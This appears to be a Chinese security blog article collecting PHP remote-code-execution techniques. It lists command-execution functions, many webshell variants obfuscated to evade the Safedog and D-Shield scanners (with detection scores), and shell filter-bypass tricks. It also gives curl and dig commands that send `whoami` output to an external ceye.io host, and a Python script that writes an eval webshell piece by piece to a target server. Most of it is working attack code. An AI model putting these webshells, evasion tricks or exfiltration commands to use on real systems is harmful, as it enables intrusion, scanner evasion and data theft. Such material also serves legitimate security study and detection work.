# PHP下的RCE总结

阅读量 **290327**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2022-01-27 14:30:59

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t01e4ab12fa43dd455f.jpg)

## 前言

为啥加了PHP的前缀，因为Java和PHP从运行机制上讲就不是有任何相同点的东西；无论是从编程还是免杀还是代码审计….

更何况Java安全近期才兴起，资料也极度匮乏

扯远了，本笔记就综合一下各大佬的笔记再加上自己的干货~梳理一下PHP命令执行的相关知识

记得区分一下：

  1. **通过代码执行漏洞来调用能执行系统命令的函数。**
  2. **通过命令执行漏洞直接执行命令。**

## Apache安装（如果你不用PHPStudy的话）

官网去[下载](https://www.apachehaus.com/cgi-bin/download.plx)，我下的时候是最新版的2.4

然后记得去`主目录/conf/httpd.conf`修改下配置文件，修改为你的Apache主目录

![](https://p0.ssl.qhimg.com/t0116e8fe2723689d52.png)

可以到`主目录/bin`下执行httpd命令，测试配置文件是否合法

    
    
    httpd -t
    

没问题的话就可以开始安装Apache服务了；n参数后面代表你自定义的服务名称，你随意

这种安装服务类基本都需要管理员权限；嫌弃麻烦可以自己建一个，用管理员权限执行cmd命令`net user administrator
/active:yes`

然后再登陆就发现多了个管理员用户啦

    
    
    httpd -k install -n Apache2.4
    

![](https://p3.ssl.qhimg.com/t0117c18e4c3974e31f.png)

安装成功后，再开启Apache服务，访问`http://localhost`出现下图就OK啦

    
    
    httpd -k start  #启动
    httpd -k stop   #停止
    sc delete Apache2.4 #卸载
    

![](https://p2.ssl.qhimg.com/t011b16b7b5a6a91b81.png)

然而后面基本都采用PHPStudy 2018的集成环境，方便（新版的设置功能差了很多，不用）

## 安全狗与D盾安装

安全狗Apache版 V4.0.28330，[下载地址](https://www.downzaiba.com/rjxz/22272.html)

安全狗安装稍微特殊一点；首先PHPstudy的网络服务都关掉，然后到PHPstudy的Apache目录下，把Apache服务安装到系统：

    
    
    httpd -k install -n Apache2.4
    httpd -k start
    

和下图一样就好啦！服务里面有Apache2.4，且开启服务没问题，PHPstudy2018里面也是绿点就OK:smile:

![](https://p1.ssl.qhimg.com/t015c04172b3dbacf04.png)

然后就可以一路顺畅安装啦~安装完记得有几个选项要关掉：

自动更新

![](https://p3.ssl.qhimg.com/t013eca906bad66d40c.png)

云安全计划

![](https://p4.ssl.qhimg.com/t01e1a8274f15b2eeb5.png)

D盾V2.1.5.4，下载[地址](https://patch.ali213.net/showpatch/154705.html)；没啥特别的，EXE就能用

## 系统命令执行函数

### **exec()**

    
    
    string exec ( string $command [, array &$output [, int &$return_var ]] )
    

**$command** 是要执行的命令

**`$output`** 是获得执行命令输出的每一行字符串， **`$return_var`** 用来保存命令执行的状态码（检测成功或失败）

**执行无回显，默认返回最后一行结果**

### **system()**

    
    
    string system ( string $command [, int &$return_var ] )
    

**$command** 为执行的命令， **& return_var**可选，用来存放命令执行后的状态码

**执行有回显，将执行结果输出到页面上**

    
    
    <?php
        system("whoami");
    ?>
    

### **passthru()**

    
    
    void passthru ( string $command [, int &$return_var ] )
    

和 **system函数** 类似， **$command** 为执行的命令， **& return_var**可选，用来存放命令执行后的状态码

**执行有回显，将执行结果输出到页面上**

    
    
    <?php
        passthru("whoami");
    ?>
    

### **shell_exec()**

    
    
    string shell_exec( string &command)
    

**& command**是要执行的命令

**函数默认无回显，通过 echo 可将执行结果输出到页面**

    
    
    <?php    echo shell_exec("whoami");?>
    

###  **反引号** `

**shell_exec() 函数实际上是反引号的变体，当禁用shell_exec时，也不可执行**

在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回

    
    
    <?php    echo `whoami`;?>
    

###  popen()

    
    
    resource popen ( string $command , string $mode )
    

函数需要两个参数，一个是执行的命令 **`command`** ，另外一个是指针文件的连接模式 **`mode`** ，有`r`和`w`代表读和写。

函数不会直接返回执行结果，而是返回一个文件指针，但是命令已经执行。

**popen()打开一个指向进程的管道，该进程由派生给定的`$command`命令执行而产生。返回一个和`fopen()`函数所返回的类似文件指针，只不过它是单向的（只能用于读或写）并且必须用`pclose()`来关闭。此指针可以用于`fgets()`，`fgetss()`和`fwrite()`**

    
    
    <?php popen( 'whoami >> 1.txt', 'r' ); ?>
    

###  proc_open()

定义如下

    
    
    resource proc_open ( 
    string $cmd , 
    array $descriptorspec , 
    array &$pipes [, string $cwd [, array $env [, array $other_options ]]] 
    )
    

一个例子

    
    
    <?php  
    $test = "ipconfig";  
    $array =   array(  
     array("pipe","r"),   //标准输入 
     array("pipe","w"),   //标准输出内容 
     array("pipe","w")    //标准输出错误 
     );  
    
    $fp = proc_open($test,$array,$pipes);   //打开一个进程通道 
    echo stream_get_contents($pipes[1]);    //为什么是$pipes[1]，因为1是输出内容 stream_get_contents — 读取资源流到一个字符串
    proc_close($fp);  
    ?>
    

###  pcntl_exec

    
    
    void pcntl_exec( string $path[, array $args[, array $envs]] )
    

pcntl是php的多进程处理扩展，在处理大量任务的情况下会使用到，pcntl需要额外安装。

\$path为可执行程序路径 (/bin/bash)

\$args表示传递给$path程序的参数； 例如pcntl_exec(“/bin/bash” , array(“whoami”));

###  ob_start

    
    
    bool ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )
    

此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。想要输出存储在内部缓冲区中的内容，可以使用
ob_end_flush() 函数。

可选参数 $output_callback如果被指定。当输出缓冲区被( ob_flush(), ob_clean()
或者相似的函数)送出、清洗的时候；或者在请求结束之际该回调函数将会被调用。

当调用时，输出缓冲区的内容会被当做参数去执行，并返回一个新的输出缓冲区作为结果，并被送到浏览器。

    
    
    <?php$cmd = 'system’; ob_start($cmd); echo "$_GET[a]"; ob_end_flush();
    

简单的说，以上代码中当运行ob_end_flush()后，$_GET[a]会被system()函数当作参数去运行，并返回运行的结果

## 代码执行函数

###  Eval和Assert

eval() 不能作为函数名动态执行代码，官方说明如下：eval 是一个语言构造器而不是一个函数，不能被可变函数调用。

**可变函数** ：通过一个变量，获取其对应的变量值，然后通过给该值增加一个括号 ()，让系统认为该值是一个函数，从而当做函数来执行。比如 assert
可这样用：

    
    
    $f='assert';$f(...);#未过D盾
    

此时 `$f` 就表示 `assert`，所以 `assert` 关键词更加灵活;

但是 PHP7 中，`assert` 也不再是函数了，变成了一个语言结构（类似`eval`），不能再作为函数名动态执行代码.

###  字符串变形

下面都将使用PHP5版本，方便用assert函数做演示

**substr()**

    
    
    substr(string,start,length)
    

substr() 函数返回字符串的一部分

参数 | 描述  
---|---  
_string_ | 必需。规定要返回其中一部分的字符串。  
_start_ | 必需。规定在字符串的何处开始。 **正数** – 在字符串的指定位置开始; **负数** – 在从字符串结尾开始的指定位置开始;
**0** – 在字符串中的第一个字符处开始  
_length_ | 可选。规定被返回字符串的长度。默认是直到字符串的结尾。 **正数** – 从 _start_ 参数所在的位置返回的长度; **负数**
– 从字符串末端返回的长度  
  
首先我们来一个基础的字符串拼接：

    
    
    <?php 
        $a = 'a'.'s'.'s'.'e'.'r'.'t';
        $a($_POST['x']); 
    ?>
    

安全狗 | D盾  
---|---  
1 个安全风险 assert 变量函数 | 级别 5 变量函数后门  
  
此时我们使用 substr() 函数稍微截断一下：

    
    
    <?php 
        $a = substr('1a',1).'s'.'s'.'e'.'r'.'t';
        $a($_POST['x']);
    ?>
    

安全狗 | D盾  
---|---  
0 个安全风险 | 级别 4变量函数后门(assert)  
  
**strtr()**

    
    
    strtr(string,from,to)
    

strtr() 函数转换字符串中特定的字符。

参数 | 描述  
---|---  
_string_ | 必需。规定要转换的字符串。  
_from_ | 必需（除非使用数组）。规定要改变的字符。  
_to_ | 必需（除非使用数组）。规定要改变为的字符。  
_array_ | 必需（除非使用 _from_ 和 _to_ ）。数组，其中的键名是更改的原始字符，键值是更改的目标字符。  
  
依然对字符串进行简单地处理一下：

    
    
    <?php     $a = strtr('azxcvt','zxcv','sser');    $a($_POST['x']);?>
    

此时就已经过掉安全狗了，D 盾检测级别降到了 1 级，检测结果如下：

安全狗 | D盾  
---|---  
0 个安全风险 | 级别 1 可疑变量函数  
  
**substr_replace()**

    
    
    substr_replace(string,replacement,start,length)
    

substr_replace() 函数把字符串 string 的一部分替换为另一个字符串 replacement。

参数 | 描述  
---|---  
_string_ | 必需。规定要检查的字符串。  
_replacement_ | 必需。规定要插入的字符串。  
_start_ | 必需。规定在字符串的何处开始替换。 **正数** – 在字符串中的指定位置开始替换; **负数** –
在从字符串结尾的指定位置开始替换; **0** – 在字符串中的第一个字符处开始替换  
_length_ | 可选。规定要替换多少个字符。默认是与字符串长度相同。 **正数** – 被替换的字符串长度; **负数** –
表示待替换的子字符串结尾处距离 _string_ 末端的字符个数。 **0** – 插入而非替换  
      
    
    <?php     $a = substr_replace("asxxx","sert",2);    $a($_POST['x']);?>
    

安全狗 | D盾  
---|---  
0 个安全风险 | 级别 1 (可疑)变量函数  
  
**trim()**

    
    
    trim(string,charlist)
    

trim() 函数移除字符串两侧的空白字符或其他预定义字符。

参数 | 描述  
---|---  
_string_ | 必需。规定要检查的字符串。  
_charlist_ | 可选。规定从字符串中删除哪些字符。如果被省略，则移除以下所有字符 `\0` – NULL; `\t` – 制表符; `\n` –
换行; `\x0B` – 垂直制表符; `\r` – 回车; **空格**  
      
    
    <?php 
        $a = trim(' assert ');
        $a($_POST['x']);
    ?>
    

安全狗 | D盾  
---|---  
0 个安全风险 | 级别 4 变量函数后门  
  
###  函数绕过

函数可以把敏感关键词当做参数传递。

    
    
    <?php 
        function sqlsec($a){
            $a($_POST['x']);
        }
        sqlsec(assert);
    ?>
    

安全狗 | D盾  
---|---  
1 个安全风险 assert变量函数 | 级别 2 变量函数后门  
  
但是换一种方式将`$_POST['x']`当做参数传递的话就都翻车了：

    
    
    <?php     function sqlsec($a){        assert($a);    }    sqlsec($_POST['x']);?>
    

安全狗 | D盾  
---|---  
1 个安全风险 assert PHP一句话后门 | 已知后门  
  
###  回调函数

常⽤的回调函数⼤部分都无法绕过 WAF 了。

**call_user_func()**

    
    
    call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] )
    

第一个参数 `callback` 是被调用的回调函数，其余参数是回调函数的参数。

    
    
    <?php    call_user_func('assert',$_POST['x']);?>
    

安全狗 | D盾  
---|---  
1 个安全风险 call_user_func后门 | 级别 5 (内藏) call_user_func后门  
  
**call_user_func_array()**

    
    
    call_user_func_array ( callable $callback , array $param_arr )
    

把第一个参数作为回调函数（`callback`）调用，把参数数组作（`param_arr`）为回调函数的的参数传入。

    
    
    <?php
        call_user_func_array(assert,array($_POST['x']));
    ?>
    

不过安全狗和 D 盾都对这个函数进行检测了：

安全狗 | D盾  
---|---  
1 个安全风险 call_user_func_array回调后门 | 级别 4 call_user_func_array  
  
**array_filter()**

    
    
    array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )
    

依次将 `array` 数组中的每个值传递到 `callback` 函数。

如果 `callback` 函数返回 true，则 `array` 数组的当前值会被包含在返回的结果数组中，数组的键名保留不变。

    
    
    <?php
        array_filter(array($_POST['x']),'assert');
    ?>
    

依然无法 Bypass

安全狗 | D盾  
---|---  
1 个安全风险 array_filter后门 | 级别 5 array_filter后门  
  
assert 手动 Base64 编码后传入，这样还会把 assert 关键词给去掉了：

    
    
    <?php
        $e = $_REQUEST['e'];
        $arr = array($_POST['pass'],);
        array_filter($arr, base64_decode($e));
    ?>
    

安全狗 | D盾  
---|---  
1 个安全风险 array_filter后门 | 级别 4 array_filter 参数  
  
**array_map()**

    
    
    array_map(myfunction,array1,array2,array3...)
    

参数 | 描述  
---|---  
_myfunction_ | 必需。用户自定义函数的名称，或者是 null。  
_array1_ | 必需。规定数组。  
_array2_ | 可选。规定数组。  
_array3_ | 可选。规定数组。  
  
array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。和 arrray_walk() 函数差不多：

    
    
    <?php    $e = $_REQUEST['e'];    $arr = array($_POST['pass'],);    array_map(base64_decode($e), $arr);?>    # payload  e=YXNzZXJ0&pass=system('dir');
    

依然被杀了，检测结果如下：

安全狗 | D盾  
---|---  
1 个安全风险 array_map执行 | 级别 5 已知后门  
  
**array_walk()**

    
    
    array_walk(array,myfunction,parameter...)
    

array_walk() 函数对数组中的每个元素应用用户自定义函数。在函数中，数组的键名和键值是参数。

参数 | 描述  
---|---  
_array_ | 必需。规定数组。  
_myfunction_ | 必需。用户自定义函数的名称。  
_userdata_ ,… | 可选。规定用户自定义函数的参数。您能够向此函数传递任意多参数。  
  
简单案例：

    
    
    <?phpfunction myfunction($value,$key){    echo "The key $key has the value $value<br>";}$a=array("a"=>"red","b"=>"green","c"=>"blue");array_walk($a,"myfunction");?>
    

运行结果如下：

    
    
    The key a has the value red
    The key b has the value green
    The key c has the value blue
    

根据这个特性手动来写一个 webshell 试试看：

    
    
    <?php
        function sqlsec($value,$key)
        {   
            $x = $key.$value;
            $x($_POST['x']);
        }
        $a=array("ass"=>"ert");
        array_walk($a,"sqlsec");
    ?>
    

这个 array_walk 有点复杂，这里用的是回调函数和自定义函数结合的姿势了。

安全狗 | D盾  
---|---  
0 个安全风险 | 级别 2 (可疑)变量函数  
  
看了下网上其他姿势：

    
    
    <?php 
      $e = $_REQUEST['e'];
      $arr = array($_POST['x'] => '|.*|e',);
        array_walk($arr, $e, '');
    ?>
    

此时提交如下 payload 的话：

    
    
    shell.php?e=preg_replace
    

最后就相当于执行了如下语句：

    
    
    preg_replace('|.*|e',$_POST['x'],'')
    

这个时候只需要 POST `x=phpinfo();` 即可。这种主要是利用了 preg_replace 的 /e 模式进行代码执行。

不过这种方法已经凉了，安全狗和 D 盾均可以识别，而且这种 preg_replace 三参数后门的 `/e`模式 PHP5.5 以后就废弃了：

安全狗 | D盾  
---|---  
1 个安全风险 array_walk执行 | 级别 5 已知后门  
  
不过 PHP 止中不止 preg_replace 函数可以执行 eval 的功能，还有下面几个类似的：

**mb_ereg_replace**

    
    
    mb_ereg_replace ( string $pattern , string $replacement , string $string [, string $option = "msr" ] ) : string
    

类似于 preg_replace 函数一样，也可以通过 e 修饰符来执行命令：

    
    
    <?php     mb_ereg_replace('\d', $_REQUEST['x'], '1', 'e');?>
    

**preg_filter**

    
    
    mixed preg_filter ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )
    

preg_filter() 等价于 preg_replace() ，但它仅仅返回与目标匹配的结果。

    
    
    <?php     preg_filter('|\d|e', $_REQUEST['x'], '2');?>
    

只是比较可惜，都无法过狗和D盾了。不过问题不大，感兴趣小伙伴可以去查阅 PHP 官方文档，还是可以找到类似函数的，可以过狗和D盾

    
    
    <?php     mb_eregi_replace('\d', $_REQUEST['x'], '1', 'e');?>
    

**array_walk_recursive()**

    
    
    array_walk_recursive(array,myfunction,parameter...)
    

array_walk_recursive() 函数对数组中的每个元素应用用户自定义函数。该函数与
array_walk()函数的不同在于可以操作更深的数组（一个数组中包含另一个数组）。

参数 | 描述  
---|---  
_array_ | 必需。规定数组。  
_myfunction_ | 必需。用户自定义函数的名称。  
_userdata_ ,… | 可选。规定用户自定义函数的参数。您能够向此函数传递任意多参数。  
      
    
    <?php
        $e = $_REQUEST['e'];
        $arr = array($_POST['pass'] => '|.*|e',);
        array_walk_recursive($arr, $e, '');
    ?>
    

安全狗 | D盾  
---|---  
1 个安全风险 php后门回调木马 | 级别 5 已知后门  
  
**array_reduce()**

    
    
    array_reduce(array,myfunction,initial)
    

array_reduce() 函数向用户自定义函数发送数组中的值，并返回一个字符串。

参数 | 描述  
---|---  
_array_ | 必需。规定数组。  
_myfunction_ | 必需。规定函数的名称。  
_initial_ | 可选。规定发送到函数的初始值。  
      
    
    <?php
        $e = $_REQUEST['e'];
        $arr = array(1);
        array_reduce($arr, $e, $_POST['x']);
    ?>
    
    <?php
        function sqlsec($value,$key)
        {   
            $x = $key.$value;
            print_r($x);
            $x($_POST['x']);
        }
        $a=array("assert");
        array_reduce($a,"sqlsec");
    ?>
    

POST 提交如下数据：`e=assert&x=phpinfo();` 但是目前已经无法过狗了。

安全狗 | D盾  
---|---  
1 个安全风险 array_reduce执行 | 级别 5 已知后门  
  
**array_udiff()**

    
    
    array_diff(array1,array2,myfunction...);
    

array_diff() 函数返回两个数组的差集数组。该数组包括了所有在被比较的数组中，但是不在任何其他参数数组中的键值。在返回的数组中，键名保持不变。

参数 | 描述  
---|---  
_array1_ | 必需。与其他数组进行比较的第一个数组。  
_array2_ | 必需。与第一个数组进行比较的数组。  
myfunction | 回调对照函数。  
      
    
    <?php    $e = $_REQUEST['e'];    $arr = array($_POST['x']);    $arr2 = array(1);    array_udiff($arr, $arr2, $e);?>
    

POST 提交如下数据：`e=assert&x=phpinfo();` 但是目前已经无法过狗。

安全狗 | D盾  
---|---  
1 个安全风险 php后门回调木马 | 级别 5 已知后门  
  
**uasort()**

    
    
    uasort(array,myfunction);
    

uasort() 函数使用用户自定义的比较函数对数组排序，并保持索引关联（不为元素分配新的键）。如果成功则返回 TRUE，否则返回
FALSE。该函数主要用于对那些单元顺序很重要的结合数组进行排序。

参数 | 描述  
---|---  
_array_ | 必需。规定要进行排序的数组。  
_myfunction_ | 可选。定义可调用比较函数的字符串。如果第一个参数小于等于或大于第二个参数，那么比较函数必须返回一个小于等于或大于 0 的整数。  
      
    
    <?php
        $e = $_REQUEST['e'];
        $arr = array('test', $_REQUEST['x']);
        uasort($arr, base64_decode($e));
    ?>
    

POST 提交的数据如下：`e=YXNzZXJ0&x=phpinfo();` 这个后门在 PHP 5.3之后可以正常运行，5.3 会提示 assert
只能有1个参数，这是因为 assert 多参数是后面才开始新增的内容，PHP 5.4.8 及更高版本的用户也可以提供第四个可选参数，如果设置了，用于将
`description` 指定到 **assert()** 。

安全狗 | D盾  
---|---  
1 个安全风险 PHP回调木马 | 级别 4 uasort 参数  
  
**uksort()**

    
    
    uksort(array,myfunction);
    

uksort() 函数通过用户自定义的比较函数对数组按键名进行排序。

参数 | 描述  
---|---  
_array_ | 必需。规定要进行排序的数组。  
_myfunction_ | 可选。定义可调用比较函数的字符串。如果第一个参数小于等于或大于第二个参数，那么比较函数必须返回一个小于等于或大于 0 的整数。  
      
    
    <?php    $e = $_REQUEST['e'];    $arr = array('test' => 1, $_REQUEST['x'] => 2);    uksort($arr, $e);?>
    

POST 的内容如下：`e=assert&x=phpinfo();` 该方法也不能 Bypass 安全狗了：

安全狗 | D盾  
---|---  
1 个安全风险 php后门回调木马 | 级别 5 已知后门  
  
**registregister_shutdown_function()**

    
    
    register_shutdown_function ( callable $callback [, mixed $... ] ) : void
    

注册一个 `callback` ，它会在脚本执行完成或者
[exit()](https://www.php.net/manual/zh/function.exit.php) 后被调用。

    
    
    <?php
        $e = $_REQUEST['e'];
        register_shutdown_function($e, $_REQUEST['x']);
    ?>
    

安全狗 | D盾  
---|---  
1 个安全风险 php后门回调木马 | 级别 5 已知后门  
  
**register_tick_function()**

    
    
    register_tick_function ( callable $function [, mixed $arg [, mixed $... ]] ) : bool
    

注册在调用记号时要执行的给定函数。

    
    
    <?php
        $e = $_REQUEST['e'];
        declare(ticks=1);
        register_tick_function ($e, $_REQUEST['x']);
    ?>
        #上面程序中“declare(ticks=1);”代表，每执行一条低级语句，就触发register_tick_function中注册的函数
    

安全狗 | D盾  
---|---  
1 个安全风险 php后门回调木马 | 级别 5 已知后门  
  
**filter_var()**

    
    
    filter_var(variable, filter, options)
    

filter_var() 函数通过指定的过滤器过滤变量。

参数 | 描述  
---|---  
variable | 必需。规定要过滤的变量。  
filter | 可选。规定要使用的过滤器的 ID。  
options | 规定包含标志/选项的数组。检查每个过滤器可能的标志和选项。  
      
    
    <?php
        filter_var($_REQUEST['x'], FILTER_CALLBACK, array('options' => 'assert'));
    ?>
    

安全狗 | D盾  
---|---  
1 个安全风险 php后门回调木马 | 级别 5 已知后门  
  
**filter_var_array()**

    
    
    filter_var_array(array, args)
    

filter_var_array() 函数获取多项变量，并进行过滤。

参数 | 描述  
---|---  
array | 必需。规定带有字符串键的数组，包含要过滤的数据。  
args | 可选。规定过滤器参数数组。合法的数组键是变量名。合法的值是过滤器 ID，或者规定过滤器、标志以及选项的数组。该参数也可以是一个单独的过滤器
ID，如果是这样，输入数组中的所有值由指定过滤器进行过滤。  
      
    
    <?php
        filter_var_array(array('test' => $_REQUEST['x']), array('test' => array('filter' => FILTER_CALLBACK, 'options' => 'assert')));
    ?>
    

安全狗 | D盾  
---|---  
0级 | 级别 5 已知后门  
  
## 异或

P 神的文章 [一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#) 里面提到了三种异或的姿势；但目前只有第一种方法可以过狗

所以只重点来看一下第一种姿势，也就是异或

国光师傅写好了一个脚本，除了字母以外的ASCII字符任意异或，能得到字母的就输出

    
    
    import string 
    from urllib.parse import quote
    keys = list(range(65)) + list(range(91,97)) + list(range(123,127)) 
    results = [] 
    for i in keys: 
        for j in keys: 
            asscii_number = i^j 
            if (asscii_number >= 65 and asscii_number <= 90) or (asscii_number >= 97 and asscii_number <= 122): 
                if i < 32 and j < 32: 
                    temp = (f'{chr(asscii_number)} = ascii:{i} ^ ascii{j} = {quote(chr(i))} ^ {quote(chr(j))}', chr(asscii_number)) 
                    results.append(temp) 
                elif i < 32 and j >=32: 
                    temp = (f'{chr(asscii_number)} = ascii:{i} ^ {chr(j)} = {quote(chr(i))} ^ {quote(chr(j))}', chr(asscii_number)) 
                    results.append(temp) 
                elif i >= 32 and j < 32: 
                    temp = (f'{chr(asscii_number)} = {chr(i)} ^ ascii{j} = {quote(chr(i))} ^ {quote(chr(j))}', chr(asscii_number)) 
                    results.append(temp) 
                else: 
                    temp = (f'{chr(asscii_number)} = {chr(i)} ^ {chr(j)} = {quote(chr(i))} ^ {quote(chr(j))}', chr(asscii_number)) 
                    results.append(temp) 
    results.sort(key=lambda x:x[1], reverse=False) 
    for low_case in string.ascii_lowercase: 
        for result in results: 
            if low_case in result: 
                print(result[0]) 
    for upper_case in string.ascii_uppercase: 
        for result in results: 
            if upper_case in result: 
                print(result[0])
    

然后执行命令，就能看见各种排列组合

    
    
    python3 try.py > Result.txt
    

![](https://p3.ssl.qhimg.com/t0169d62eff8ccfe18a.png)

根据这个受了启发，GitHub上写了个混淆脚本

## PHP7免杀脚本制作

eval和assert都变成了语言结构，无法成为可变函数了….所以PHP7开始免杀资料就销声匿迹了-=-
故而PHP7常用的技术重点不在隐藏函数名（也没必要，已经藏不了了）

PHP7支持`(可变函数名)(参数)`这样的用法

    
    
    <?php
        $a='system';
        ($a)($_REQUEST['cmd']);
    ?>
    

我已经自写了个工具，项目见[GitHub](https://github.com/Great-Wan/WebShell_Confuse_and_Command_Split)

## 命令执行绕过

Linux下一些命令操作符的科普

>   1. cmd1 | cmd2 (|管道操作符)将cmd1的结果输出给cmd2
>   2. cmd1 & cmd2 (&和号操作符)让命令在后台运行
>   3. cmd1 ; cmd2 (; 分号操作符)执行多条命令
>   4. cmd1 && cmd2 (&& 与操作符)只有cmd1命令执行成功后，才会执行cmd2
>   5. cmd1 || cmd2 (|| 或操作符)cmd1执行失败，才会执行cmd2
>

### **空格绕过**

**字符串拼接**

IFS(内部域分隔)，是Shell的内置变量，是一个用于分割字段的字符列表，默认值是空白(包括空格、tab、换行)

可以有以下变形:

    
    
    cat$IFS$数字a.txtcat${IFS}a.txtcat$IFS'a.txt'
    

**使用{}**

    
    
    例如{cat,a.txt}
    

**使用Tab，PHP环境下可用**

    
    
    cat%09/etc/passwd
    

**在读取文件的时候利用重定向符 <>**

    
    
    cat<>text cat<text
    

###  黑名单关键字绕过

**字符串拼接**

    
    
    a=c;b=at;c=a;d=txt;$a$b $c.$da=c;b=at;c=a;d=txt;$a$b ${c}.${d}
    

![](https://p1.ssl.qhimg.com/t01154bc11ed1d5dbd5.png)

**利用环境变量取值**

    
    
    echo ${SHELLOPTS}braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitorecho ${SHELLOPTS:3:1}c${SHELLOPTS:3:1}at a.txtHello!
    

![](https://p0.ssl.qhimg.com/t01496eb6991f5798d8.png)

**使用空变量**

    
    
    c${z}at a.txt
    

![](https://p5.ssl.qhimg.com/t01a65e3eb247110ab3.png)

**利用通配符**

    
    
    /bin/ca? a*Hello!
    

这里要注意，你使用的命令补全时会不会存在歧义，比如ca补全时，三个字母的有`cal`和`cat`两种

cal的路径和cat的路径完全不一样，这也是这里为什么要指定路径的缘故

![](https://p1.ssl.qhimg.com/t01c634f100d64fa841.png)

**使用反斜杠**

\ 在bash中被解释为转义字符，用于去除一个单个字符的特殊意义；它保留了跟随在之后的字符的字面值，除了换行符。

如果在反斜线之后出现换行字符，转义字符使行得以继续。

    
    
    wzf@wzf-virtual-machine:~$ ca\> t a.txtHello!wzf@wzf-virtual-machine:~$ ca\t a.txtHello!
    

**Base64编码**

    
    
    wzf@wzf-virtual-machine:~$ echo at | base64YXQKwzf@wzf-virtual-machine:~$ c$(echo YXQK | base64 -d) a.txtHello!
    

![](https://p1.ssl.qhimg.com/t0193e6b1099981c9b8.png)

**其他占位符**

其实核心都是为了占个位置罢了,下面这些都行的

    
    
    wzf@wzf-virtual-machine:~$ c`echo a`t a.txtHello!wzf@wzf-virtual-machine:~$ c``at a.txtHello!wzf@wzf-virtual-machine:~$ c''at a.txtHello!wzf@wzf-virtual-machine:~$ c""at a.txt Hello!wzf@wzf-virtual-machine:~$ c$(echo '')at a.txtHello!wzf@wzf-virtual-machine:~$ c`echo a`t a.txtHello!
    

###  无回显绕过

其实都大同小异，使用dnslog、ceye这类的外带网站或者BP Collaborator进行外带操作

dnslog适合一次性使用，无须注册；Ceye适合多次使用，需要注册。都是免费的~

PS:ceye是真的慢啊=.=

**使用HTTP协议**

    
    
    curl 34kk35.ceye.io/`whoami`
    

![](https://p4.ssl.qhimg.com/t01abc1101556bf2976.png)

或者加上编码也可

    
    
    curl 34kk35.ceye.io/$(whoami | base64)
    

![](https://p5.ssl.qhimg.com/t0148df8006e9749401.png)

**使用DNS**

    
    
    dig `whoami`.34kk35.ceye.io
    

![](https://p4.ssl.qhimg.com/t013e6c13345d4150ff.png)

###  后续用到的马

    
    
    <?php    $cmd = $_POST['cmd'];    system($cmd);?>
    

如果没有特殊指出，基本上用到的马都是这个哦

###  拆分

其实一开始的想法就是把命令拆分然后发出去…顺带还能过WAF，所以一时兴起写了它

Linux下很简单就不写了，重点写个Windows；有一些DOS语法糖~看不懂的可以私信

    
    
    #Windows下写马脚本，用以命令拆分~import requestsfrom loguru import loggersession=requests.Session()command=f'<?php eval($_GET[s]);?>'blacklist=['<','>','>>','@','[',']',';',':','(',')','$','&','|','&&','||','+','-','~','*','/','?']def run(chuan):  url = "http://192.168.85.142:80/"  headers = {    "Pragma": "no-cache",        "Cache-Control": "no-cache",     "Upgrade-Insecure-Requests": "1",     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",     "Content-Type": "application/x-www-form-urlencoded",     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",     "Accept-Encoding": "gzip, deflate",    "Accept-Language": "zh-CN,zh;q=0.9",     "Connection": "close"    }  data = {"cmd": chuan}  try:    res=session.post(url, headers=headers, data=data)    print(res.text)  except Exception as e:    logger.exception(e)def judge(c):    if c in blacklist:      run(f'set /p=^{c}<nul>>1')    else:      run(f'set /p={c}<nul>>1')for i in range(0,len(command)):  if i+1 != len(command) and command[i+1] == ' ':    judge(command[i]+command[i+1])  elif command[i] != ' ':    judge(command[i])  else:    continue
    

这样就能成功写进去了

![](https://p4.ssl.qhimg.com/t010b804b3f8dfb9ea2.png)

当然，还是有几个缺点的：

  1. 由于命令行里面0~9单个数字是有特殊用处的，所以不能出现单个数字（两位及以上就正常了）
  2. 因为得按序写，无法使用多线程-=-如果命令相当长+网络环境不好得蛮久
  3. 黑名单是自己想了一些DOS特殊符号，并不是很全；大家有补充可以填进去

###  拆分思路扩展

**一个CTF题学习代码执行拆分**

比如有以下限制

    
    
    <?php    $cmd = $_POST['cmd'];    if(strlen($cmd) < 长度){        eval($cmd);    }?>
    

**长度要求小于17**

可以这么嵌套用，刚好cmd的长度为16

按道理这里不需要eval，但是不加eval并不会执行…调试也没发现为什么

    
    
    cmd=eval($_POST[1]);&1=system('dir c:\*');
    

**长度要求小于15**

可以直接改成GET方式

![](https://p2.ssl.qhimg.com/t01cceda1bf55f1d9d4.png)

或者可以采取其他方式：如果是Linux下需要执行 echo \<?php eval($_GET[1]);?>>1

    
    
    echo \<?php >1echo eval\(>>1echo \$_GET>>1echo \[1\]>>1echo \)\;?>>1
    

**时间倒序写入**

通过

    
    
     >命令内容\\
    

来写入空文件，再将空文件目录按照时间顺序进行排列；再写入到命令集合文件a中

最后利用`sh a` 来执行a文件中的命令，来突破长度限制

有几个注意事项：

  * .为linux隐藏文件，不能作为文件开头
  * 我们需要按照时间顺序来排序最后的结果，ls默认以字母排序

![](https://p1.ssl.qhimg.com/t01c1c163dc89fd6b9b.png)

我已经写好了一个脚本，放在了Github上~

<https://github.com/Great-Wan/WebShell_Confuse_and_Command_Split>

可以用它自动化完成这一操作

## 参考链接

[独特的免杀思路](http://uuzdaisuki.com/2021/05/11/webshell%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6php%E7%AF%87/)

[PHP7后的免杀思路](https://www.anquanke.com/post/id/193787)

